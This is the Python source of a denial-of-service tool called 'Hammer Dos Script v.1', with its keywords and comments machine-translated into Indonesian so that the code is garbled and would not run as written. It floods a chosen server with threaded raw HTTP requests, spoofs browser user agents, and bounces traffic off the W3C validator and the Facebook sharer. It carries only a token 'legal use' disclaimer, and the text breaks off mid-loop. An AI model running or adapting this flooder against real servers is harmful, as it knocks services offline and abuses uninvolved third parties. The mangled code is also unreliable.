# ! / usr / bin / python3
# - * - coding: utf-8 - * -

# python 3.3.2+ Hammer Dos Script v.1
# oleh Can Yalçın
# hanya untuk tujuan hukum


dari antrian impor antrian
dari OptionParser impor optparse
waktu impor , sys, socket, threading, logging, urllib.request, acak

def  user_agent ():
	uagent global
	uagent = []
	uagent.append ( " Mozilla / 5.0 (kompatibel; MSIE 9.0; Windows NT 6.0) Opera 12.14 " )
	uagent.append ( " Mozilla / 5.0 (X11; Ubuntu; Linux i686; rv: 26.0) Gecko / 20100101 Firefox / 26.0 " )
	uagent.append ( " Mozilla / 5.0 (X11; U; Linux x86_64; en-US; rv: 1.9.1.3) Gecko / 20090913 Firefox / 3.5.3 " )
	uagent.append ( " Mozilla / 5.0 (Windows; U; Windows NT 6.1; en; rv: 1.9.1.3) Gecko / 20090824 Firefox / 3.5.3 (.NET CLR 3.5.30729) " )
	uagent.append ( " Mozilla / 5.0 (Windows NT 6.2) AppleWebKit / 535.7 (KHTML, seperti Gecko) Comodo_Dragon / 16.1.1.0 Chrome / 16.0.912.63 Safari / 535.7 " )
	uagent.append ( " Mozilla / 5.0 (Windows; U; Windows NT 5.2; en-US; rv: 1.9.1.3) Gecko / 20090824 Firefox / 3.5.3 (.NET CLR 3.5.30729) " )
	uagent.append ( " Mozilla / 5.0 (Windows; U; Windows NT 6.1; en-US; rv: 1.9.1.1) Gecko / 20090718 Firefox / 3.5.1 " )
	kembali (uagent)


def  my_bots ():
	bot global
	bots = []
	bots.append ( " http://validator.w3.org/check?uri= " )
	bots.append ( " http://www.facebook.com/sharer/sharer.php?u= " )
	kembali (bots)


def  bot_hammering ( url ):
	coba :
		sementara  True :
			req = urllib.request.urlopen (urllib.request.Request (url, header = { ' User-Agent ' : random.choice (uagent)}))
			print ( " \ 033 [94mbot dipalu ... \ 033 [0m " )
			time.sleep ( .1 )
	kecuali :
		time.sleep ( .1 )


def  down_it ( item ):
	coba :
		sementara  True :
			packet =  str ( " GET / HTTP / 1.1 \ n Host: " + host + " \ n \ n User-Agent: " + random.choice (uagent) + " \ n " + data) .encode ( ' utf-8 ' )
			s = socket.socket (soket. AF_INET , soket. SOCK_STREAM )
			s.connect ((host, int (port)))
			jika s.sendto (paket, (host, int (port))):
				s.shutdown ( 1 )
				print ( " \ 033 [92m " , time.ctime (time.time ()), " \ 033 [0m \ 033 [94m <- paket dikirim! hammering -> \ 033 [0m " )
			lain :
				s.shutdown ( 1 )
				print ( " \ 033 [91mshut <-> turun \ 033 [0m " )
			time.sleep ( .1 )
	kecuali socket.error sebagai e:
		print ( " \ 033 [91tidak ada koneksi! server mungkin turun \ 033 [0m " )
		# print ("\ 033 [91m", e, "\ 033 [0m")
		time.sleep ( .1 )


def  dos ():
	sementara  True :
		item = q.get ()
		down_it (item)
		q.task_done ()


def  dos2 ():
	sementara  True :
		item = w.get ()
		bot_hammering (random.choice (bots) + " http: // " + host)
		w.task_done ()


 penggunaan def ():
	print ( '' '  \ 033 [92m Hammer Dos Script v.1 http://www.canyalcin.com/
	Merupakan tanggung jawab pengguna akhir untuk mematuhi semua hukum yang berlaku.
	Ini hanya untuk skrip pengujian server. Ip Anda terlihat. \ n
	penggunaan: python3 hammer.py [-s] [-p] [-t]
	-h: bantuan
	-s: ip server
	-p: port default 80
	-t: turbo default 135 \ 033 [0m '' ' )
	sys.exit ()


def  get_parameters ():
	tuan rumah global
	port global
	global thr
	barang global
	optp = OptionParser ( add_help_option = Salah , epilog = " Palu " )
	optp.add_option ( " -q " , " --quiet " , help = " set logging ke ERROR " , action = " store_const " , dest = " loglevel " , const = logging. ERROR , default = logging. INFO )
	optp.add_option ( " -s " , " --server " , dest = " host " , help = " serang ke server ip -s ip " )
	optp.add_option ( " -p " , " --port " , ketik = " int " , dest = " port " , help = " -p 80 default 80 " )
	optp.add_option ( " -t " , " --turbo " , ketik = " int " , dest = " turbo " , help = " default 135 -t 135 " )
	optp.add_option ( " -h " , " --help " , dest = " help " , action = ' store_true ' , help = " membantu Anda " )
	opts, args = optp.parse_args ()
	logging.basicConfig ( level = opts.loglevel, format = ' % (levelname) -8s  % (pesan) s ' )
	jika opts.help:
		pemakaian()
	jika opts.host adalah  tidak  ada :
		host = opts.host
	lain :
		pemakaian()
	jika opts.port is  None :
		port =  80
	lain :
		port = opts.port
	jika opts.turbo adalah  Tidak Ada :
		thr =  135
	lain :
		thr = opts.turbo


# header membaca
data global
header =  buka ( " headers.txt " , " r " )
data = headers.read ()
header.close ()
# antrian tugas adalah q, w
q = Antrean ()
w = Antrian ()


jika  __name__  ==  ' __main__ ' :
	jika  len (sys.argv) <  2 :
		pemakaian()
	get_parameters ()
	cetak ( " \ 033 [92m " , host, " port: " , str (port), " turbo: " , str (thr), " \ 033 [0m " )
	print ( " \ 033 [94mHarap tunggu ... \ 033 [0m " )
	Agen pengguna()
	my_bots ()
	time.sleep ( 5 )
	coba :
		s = socket.socket (soket. AF_INET , soket. SOCK_STREAM )
		s.connect ((host, int (port)))
		s.settimeout ( 1 )
	kecuali socket.error sebagai e:
		print ( " \ 033 [91mcheck server ip dan port \ 033 [0m " )
		pemakaian()
	sementara  True :
		untuk i dalam  rentang ( int (thr)):
			t = threading.Thread ( target = dos)
			t.daemon =  True   # jika ada thread, ia akan mati
			t.start ()
			t2 = threading.Thread ( target = dos2)
			t2.daemon =  True   # jika ada thread, ia akan mati
			t2.start ()
		start = time.time ()
		# tasking
		butir =  0
		sementara  True 
